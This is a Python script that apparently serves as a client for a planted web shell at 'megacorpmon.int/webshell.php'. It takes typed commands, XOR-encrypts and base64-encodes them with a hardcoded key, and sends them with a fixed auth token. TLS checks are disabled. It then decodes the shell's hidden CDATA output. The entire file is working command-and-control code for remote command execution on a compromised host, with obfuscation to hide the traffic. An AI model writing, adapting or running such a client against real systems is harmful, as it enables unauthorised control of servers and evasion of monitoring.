import requests
import base64
import urllib3
import re 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

key = "RedTeam2024"
auth = "123456"
headers= { 
"Content-Type": "application/x-www-form-urlencoded",
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
"Accept": "application/json, text/plain, */*",
"Accept-Language": "en-US,en;q=0.9",
"Accept-Encoding": "gzip, deflate, br",
"Connection": "keep-alive"
}
proxies = {
    "http": "http://127.0.0.1:8081",
    "https": "http://127.0.0.1:8081"
}

def xor_data(data, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))


def base64_encode(data):
    return base64.b64encode(data.encode('utf-8')).decode('utf-8')

def get_user_command():
    command = input("Enter your command: ")
    if command.lower() == "exit":
        print("Exiting...")
        exit(0)
    return base64_encode(xor_data(command, key))

def send_command(command):
    url = "https://megacorpmon.int/webshell.php"
    payload = {
        "auth": auth,
        "data": command
    }
    try:
        response = requests.post(url, headers=headers, data=payload, verify=False, proxies=proxies)
        if response.status_code == 200:
            return response
        else:
            print(f"Error: Received status code {response.status_code}")
            return None
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return None
    
def get_response(response):
    html = response.text
    match = re.search(r'<!\[CDATA\[(.*?)\]\]>', html)
    if match:
        # return with reverse operation as request - xor and base64 decode
        decoded_data = base64.b64decode(match.group(1)).decode('utf-8')
        decoded_data = xor_data(decoded_data, key)
        return decoded_data
    else:
        print("No valid response found in the HTML.")
        return None

def main():
    while True:
        command = get_user_command()
        response = send_command(command)
        if response:
            print("Response from server:", get_response(response))
        else:
            print("Failed to get a valid response.")    

if __name__ == "__main__":
    main()
else:
    print("This script is intended to be run as a standalone program.")
    print("Please run it directly to interact with the server.")
    exit(1) 

# This script is designed to interact with a server at megacorpmon.int
# It allows users to send commands that are XOR encrypted and base64 encoded.           

